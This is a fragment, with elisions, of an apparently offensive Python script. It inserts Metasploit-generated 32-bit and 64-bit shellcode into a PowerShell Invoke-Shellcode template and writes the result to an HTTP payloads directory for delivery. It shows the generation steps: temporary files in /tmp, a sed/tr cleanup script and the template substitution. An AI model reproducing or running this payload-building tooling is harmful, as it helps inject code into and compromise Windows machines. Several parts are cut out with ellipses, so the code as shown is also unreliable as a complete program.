...
template = """function Invoke-Shellcode
{
<#
.SYNOPSIS
...
#>
    ...
    else
    {
        ...
        [Byte[]] $Shellcode32 = @([shellcode_x32])

        # 64-bit payload
        # msfpayload windows/x64/exec CMD="calc" EXITFUNC=thread
        [Byte[]] $Shellcode64 = @([shellcode_x64])
    }
...
#somehow 
cmd = '''cat /tmp/shell | sed '1,6d;s/[\";]//g;s/\\\\/,0/g'| tr -d '\\n' | cut -c2- > /tmp/yolo'''
file = open('/tmp/shell', 'w')
item = file.write(result.stdout.decode('utf-8'))
file.close()

file = open('/tmp/fix.sh', 'w')
item = file.write(cmd)
file.close()

cmd = "chmod +x /tmp/fix.sh"
...
file.close()
#create the payload
template = template.replace('[shellcode_x32]', shell32.replace('\n', '')).replace('[shellcode_x64]', shell64.replace('\n', ''))


#housekeeping

#create the file with raw ouput
file = open('http/payloads/invoke-shellcode.ps1', 'w')
